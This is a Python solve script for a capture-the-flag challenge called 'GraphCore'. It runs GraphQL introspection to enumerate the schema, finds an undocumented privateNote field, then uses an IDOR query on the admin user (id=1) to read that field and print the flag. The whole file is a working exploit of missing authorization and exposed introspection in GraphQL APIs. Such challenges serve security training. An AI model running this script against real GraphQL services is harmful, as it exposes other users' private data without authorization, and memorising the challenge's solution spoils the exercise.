#!/usr/bin/env python3
"""
GraphCore — Reference solve script
Vulnerability: GraphQL Introspection + IDOR on privateNote field

Usage:
    python solve.py <host> [port]
    python solve.py localhost 8080
"""

import sys
import json
import urllib.request
import urllib.error


def gql(host, port, query):
    url = f"http://{host}:{port}/graphql"
    payload = json.dumps({"query": query}).encode()
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = sys.argv[2] if len(sys.argv) > 2 else "8080"

    print(f"[*] Target: http://{host}:{port}")

    # Step 1 — Introspection: enumerate all types and their fields
    print("\n[1] Running GraphQL introspection...")
    introspection_query = """
    {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    """
    result = gql(host, port, introspection_query)
    types = result.get("data", {}).get("__schema", {}).get("types", [])

    print("[+] Types found:")
    for t in types:
        if t.get("fields"):
            fields = [f["name"] for f in t["fields"]]
            print(f"    {t['name']}: {fields}")

    # Step 2 — Identify UserType has privateNote
    print("\n[2] Scanning for undocumented fields...")
    user_type = next((t for t in types if t.get("name") == "UserType"), None)
    if user_type:
        print(f"[+] UserType fields: {[f['name'] for f in user_type['fields']]}")
        if any(f["name"] == "privateNote" for f in user_type["fields"]):
            print("[!] FOUND undocumented field: privateNote")

    # Step 3 — Query admin user (id=1) for privateNote
    print("\n[3] Querying admin user (id=1) for privateNote...")
    result = gql(host, port, '{ user(id: 1) { id username email privateNote } }')
    user = result.get("data", {}).get("user", {})
    print(f"[+] Admin user: {json.dumps(user, indent=2)}")

    flag = user.get("privateNote", "")
    if flag and flag.startswith("CTF{"):
        print(f"\n[FLAG] {flag}")
    else:
        print(f"\n[?] privateNote value: {flag}")
        print("    (May not start with CTF{ depending on the challenge config)")


if __name__ == "__main__":
    main()
